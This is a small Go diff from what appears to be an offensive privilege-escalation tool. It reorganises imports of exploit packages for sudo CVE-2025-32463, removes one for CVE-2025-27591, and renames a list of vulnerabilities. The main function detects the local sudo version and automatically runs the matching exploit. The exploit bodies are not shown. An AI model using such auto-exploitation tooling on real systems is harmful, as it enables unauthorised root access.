@@ -4,9 +4,8 @@ import (
 	"fmt"
 	"os/exec"
 	"regexp"
-	"up0x/payload/exploits/Below/CVE-2025-27591"
 	"up0x/payload/exploits/misconfig/SUID"
-	"up0x/payload/exploits/sudo/CVE-2025-32463"
+	"up0x/payload/exploits/third_parts/sudo/CVE-2025-32463"
 	versionutil "up0x/util"
 )
 
@@ -53,10 +52,10 @@ func main() {
 			fmt.Println("[+] Sudo version:", sudoVersion)
 		}
 	}
-	vulns := []Vuln{
+	sudo_vulns := []Vuln{
 		{"CVE-2025-32463", "1.9.14", "1.9.17", &CVE_2025_32463.Exploit{}},
 	}
-	for _, v := range vulns {
+	for _, v := range sudo_vulns {
 		if versionutil.VersionInRange(sudoVersion, v.MinVer, v.MaxVer) {
 			fmt.Println("[+]", v.Name, "vulnerability found")
 			v.ExploitFunc.Run()
